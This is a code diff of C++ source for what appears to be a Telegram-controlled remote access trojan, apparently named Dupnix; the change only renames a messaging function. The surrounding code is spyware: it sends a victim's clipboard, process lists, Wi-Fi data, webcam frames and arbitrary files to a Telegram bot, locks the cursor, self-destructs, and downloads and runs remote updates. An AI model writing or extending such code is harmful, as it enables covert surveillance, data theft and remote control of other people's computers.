@@ -36,7 +36,7 @@ void getStatus(std::string) {
 
     status += "\nversion: " + VERSION + '\n';
 
-    telegram::Send(status);
+    telegram::SendText(status);
 }
 
 void setID(std::string newID) {
@@ -51,7 +51,7 @@ void setID(std::string newID) {
 
 void setVolume(std::string value) {
     if (value.empty()) {
-        telegram::Send("Current volume: " + tools::ChangeVolume());
+        telegram::SendText("Current volume: " + tools::ChangeVolume());
         return;
     }
 
@@ -67,7 +67,7 @@ void setVolume(std::string value) {
         value.erase(0, 1);
 
     if (value.find_first_not_of("0123456789") != std::string::npos) {
-        telegram::Send("invalid syntax");
+        telegram::SendText("invalid syntax");
         return;
     }
 
@@ -86,7 +86,7 @@ void setVolume(std::string value) {
 
 
     tools::ChangeVolume(static_cast<float>(volume * 0.01), 1);
-    telegram::Send("current volume: " + std::to_string(volume));
+    telegram::SendText("current volume: " + std::to_string(volume));
 }
 
 void Screenshot(std::string) {
@@ -125,12 +125,12 @@ void SetCursor(std::string cords) {
     }
 
     if (x.find_first_not_of("0123456789") != std::string::npos) {
-        telegram::Send("invalid syntax");
+        telegram::SendText("invalid syntax");
         return;
     }
 
     if (y.find_first_not_of("0123456789") != std::string::npos) {
-        telegram::Send("invalid syntax");
+        telegram::SendText("invalid syntax");
         return;
     }
 
@@ -160,7 +160,7 @@ void Delay(std::string delay) {
     }
 
     if (seconds.find_first_not_of("0123456789") != std::string::npos) {
-        telegram::Send("invalid syntax");
+        telegram::SendText("invalid syntax");
         return;
     }
 
@@ -171,7 +171,7 @@ void Delay(std::string delay) {
 
 void BlockCursor(std::string time) {
     if (time.find_first_not_of("0123456789") != std::string::npos) {
-        telegram::Send("invalid syntax");
+        telegram::SendText("invalid syntax");
         return;
     }
 
@@ -333,7 +333,7 @@ void SendClipboard(std::string) {
     if (buff) 
         text = buff;
 
-    telegram::Send(text);
+    telegram::SendText(text);
 }
 
 void Autodestruction(std::string) {
@@ -386,11 +386,11 @@ void ProcessList(std::string) {
         s.erase(pos - abs(i - pos), (pos - i) + 4);
         pos = s.find(".exe");
     }
-    telegram::Send(list);
+    telegram::SendText(list);
 }
 
 void IsFileExists(std::string path) {
-    telegram::Send("File: " + path + (tools::filexists(path) ? " exits" : " not exits"));
+    telegram::SendText("File: " + path + (tools::filexists(path) ? " exits" : " not exits"));
 }
 
 void WebcamView(std::string) {
@@ -400,7 +400,7 @@ void WebcamView(std::string) {
     cv::Mat save_img; cap >> save_img;
 
     if (save_img.empty()){
-        telegram::Send("Something is wrong with the webcam, could not get frame.");
+        telegram::SendText("Something is wrong with the webcam, could not get frame.");
         return;
     }
     // Save the frame into a file
@@ -412,12 +412,12 @@ void WebcamView(std::string) {
 }
 
 void RunningApps(std::string) {
-    telegram::Send(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42,TELEGRAM_MAX));
+    telegram::SendText(tools::cmd_output("powershell \"gps | where{ $_.MainWindowHandle -ne 0 } | select ProcessName").substr(42,TELEGRAM_MAX));
 }
 
 void ListOfFiles(std::string path) {
     if (!tools::is_path(path)) {
-        telegram::Send("Path doesn't exists or it's a file");
+        telegram::SendText("Path doesn't exists or it's a file");
         return;
     }
 
@@ -430,7 +430,7 @@ void ListOfFiles(std::string path) {
 
         output += '\n';
     }
-    telegram::Send(output);
+    telegram::SendText(output);
 }
 
 //legacy code from old project, may look like a piece of shit but it works (i mean i think it works)
@@ -471,7 +471,7 @@ void WifiList(std::string) {
         }
         output += '\n';
     }
-    telegram::Send(output);
+    telegram::SendText(output);
 }
 
 
@@ -505,13 +505,13 @@ void ChangeCfg(std::string change) {
         tools::change_cfg(nlohmann::json::parse(change));
     }
     catch (...) {
-        telegram::Send("Wrong Syntax!");
+        telegram::SendText("Wrong Syntax!");
     }
 }
 
 void UpdateDupnix(std::string link) {
     if (!tools::DownloadFile(link, "temp")) {
-        telegram::Send("Can't Download!");
+        telegram::SendText("Can't Download!");
         return;
     }
     std::ofstream update("a.bat");
@@ -535,15 +535,15 @@ void DownloadFile(std::string link) {
 
     std::string fileName = link.substr(lastSlashPos + 1, link.size());
     if (!tools::DownloadFile(link, fileName)) {
-        telegram::Send("Can't Download!");
+        telegram::SendText("Can't Download!");
         return;
     }
 
-    telegram::Send("Downloaded.");
+    telegram::SendText("Downloaded.");
 
 }
 
 void SendFile(std::string path) {
     if (!telegram::SendFile(path))
-        telegram::Send("Couldn't send!");
+        telegram::SendText("Couldn't send!");
 }
